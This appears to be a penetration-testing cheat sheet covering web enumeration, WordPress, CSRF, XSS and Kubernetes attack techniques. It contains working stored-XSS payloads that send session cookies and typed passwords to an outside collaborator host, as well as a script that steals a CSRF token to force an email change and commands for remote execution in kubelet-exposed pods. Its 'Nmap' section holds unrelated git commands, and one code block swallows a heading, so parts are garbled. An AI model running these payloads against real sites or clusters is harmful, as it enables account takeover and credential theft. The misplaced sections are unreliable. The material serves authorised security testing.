## Scanning/Enumeration
### Tools
- Nmap 
- Nikto
- Dirbuster
- Dirb
- Gobuster

### Nmap
```
git status
git add
git commit
```
### Fingerprinting

A very handy tool is Wappalyzer browser extension for a basic technology fingerprint. Then one can use [whatweb](https://github.com/urbanadventurer/WhatWeb).
```
./whatweb reddit.com
```
### Request manipulation 
In order to view all requests being made one can use Burp suite or view them directly from the browser with pressing
<kbd>F12</kbd> -> Network tab + <kbd>Shift</kbd> + <kbd>CTRL</kbd> + <kbd>R</kbd> 
### Gobuster

#### Directory enumeration
```
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -e -t 10
```
#### DNS subdomain enumeration
```
gobuster dns -d <domain_name> -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -t 20
```
#### LDAP 
Find public information about the ldap server:
```
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
## WEB

### AngularJS

AngularJS up to 1.8.3 has reached its EOL and is now deprecated and the world shifted to Angular. If there is a service build in AngularJS there is a number of CVEs available causing mainly ReDOS issues. ReDOS stands for regular expression Denial-of-Service and is explained in detail [here](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS). The main CVEs available are the following:

- CVE-2024-21490 - Regular Expression Denial of Service (ReDoS) (versions >=1.3.0)
- CVE-2023-26116 - Regular Expression Denial of Service (ReDoS) (versions >=1.2.21)
- CVE-2023-26117 - Regular Expression Denial of Service (ReDoS) (versions >=1.0.0)
- CVE-2022-25869 - Cross-site Scripting (XSS) (all versions)
- CVE-2022-25844 - Regular Expression Denial of Service (ReDoS) (versions >1.7.0 )
- CVE-2023-26118 - Regular Expression Denial of Service (ReDoS) (versions >=1.4.9)
  
### Flask
If a flask application is tested there are some flask-specific things we should consider. In some flask installations the debug mode is left enabled and can be accessed at /console, which might enable RCE. Also, if tokens are used, flash-unsign can be used as described in [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) to decode, bruteforce the secret key or forge a token. 

For a flask application directory listing, a specially crafted wordlist can be found [here](https://blog.r0b.re/assets/flask-wordlist.txt).
### Wordpress

- Run wpscan to gain basic information on the website.

- Check for installed plugins, themes and default pages.

- By default, the route /wp-json/wp/v2/user can list users. 

- Try bruteforcing the login page and see if lockout policy is implemented, if DoS is prevented via blocking or connection throttling. To test the lockout, try 100+ passwords and then try to login.

- Check all possible input fields around the page for client-side vulnerabilities (ex. XSS, CSRF)

- Check if XML-RPC is enabled. Issuing a POST request to /xmlrpc.php with the following payload should return all available methods (if enabled):
```
  <?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params>
    <param>
    </param>
  </params>
</methodCall>
```
If enabled various attacks can be tested, Pingback, code injection, bruteforce etc.

### CSRF

If csrf token is present:
- Change method of request from POST to GET
- Try removing the csrf token from request completely
- Check if csrf token is tied to user session. Check if a csrf token of a logged in user will be accepted when the request is made by another user. 

### XSS

#### Reflected XSS

- Bypassing filters - When tags are filtered, use Burp to enumerate custom tags that pass the check. Use this custom tag with an onfocus event or an available event with a certain id, ex. id=’x’ and the code #x in the end of the command in order focus on this element as soon as the page is loaded.

#### Stored XSS

- Getting the session cookie of a user
```
<script> 
fetch('https://727hmmjs30bdhtmvi7l0ww5m8de42vqk.oastify.com', 
{ method: 'POST', 
mode: 'no-cors', 
body:document.cookie }); 
</script>
```

- Getting the user’s username and password
```
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
- Forcing the user to issue a change mail request with a csrf token embedded
```
<script> var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() 
	{ var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
var changeReq = new XMLHttpRequest(); 
changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; 
#### Resources 
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
- https://github.com/rm-onata/xmlrpc-attack
```
A great trick to test for Blind XSS, especially in APIs, is to use the Burp's Collaborator. You first need to open the Collaborator's tab and copy the address. It should look something like:
```
http://kl9vcmmk0ja46srf21jmn7qhx83zrqff.oastify.com/
```
Then consruct an XSS payload that will try to fetch the Collaborator's URL and send it as a value in the potentially vulnerable parameter. An example would be:
```
"'\"><svg\/onload=fetch'\/\/kl9vcmmk0ja46srf21jmn7qhx83zrqff.oastify.com'>"
```
#### Payload lists
- https://github.com/payloadbox/xss-payload-list

### Kubernetes

Kubernetes dashboard is available at:
```
https://<IP>:8443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```
An interesting directory to look at, especially if anonymous authentication is not enabled is the following:
```
https://<IP>:10250/runningpods/
```
which lists all running pods and information about them.

In order to check for RCE inside pods, one  can try to issue the following request:
```
curl -k -XPOST "https://<IP>:10250/run/<namespace>/<pod>/<container>" -d “cmd=<command>"
```
In order to interact with the Kubernetes kubelet there is a tool called [Kubeletctl](https://github.com/cyberark/kubeletctl). By issuing the following command one can execute commands into a pod.
```
kubeletctl -s <IP> exec "/bin/bash" -p nginx -c nginx
```
Interesting file locations inside a kubernetes pod:
- The locations of the ServiceAccount object, which is managed by Kubernets and provides identity within the pod
```
    /run/secrets/kubernetes.io/serviceaccount
    /var/run/secrets/kubernetes.io/serviceaccount
    /secrets/kubernetes.io/serviceaccout
```
With the kubectl one can interact with the kubernetes cluster. With the following command the capabilities of the specified user in the token can be listed:
```
kubectl auth can-i --list --token $(cat ./token) -s https://<IP>:8443 --certificate-authority ca.crt -n default
```
#### Resources:
- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/pentesting-kubernetes-services
- https://medium.com/@noah_h/top-offensive-techniques-for-kubernetes-a71399d133b2
- https://www.trendmicro.com/en_ca/research/22/e/the-fault-in-our-kubelets-analyzing-the-security-of-publicly-exposed-kubernetes-clusters.html
- https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster
### Useful web tools
- [CyberChef](https://icyberchef.com) - A powerful encoder/decoder for most formats.
- [Cirt.net](https://cirt.net/passwords) - A comprehensive list of common/default password for vendor products and services.
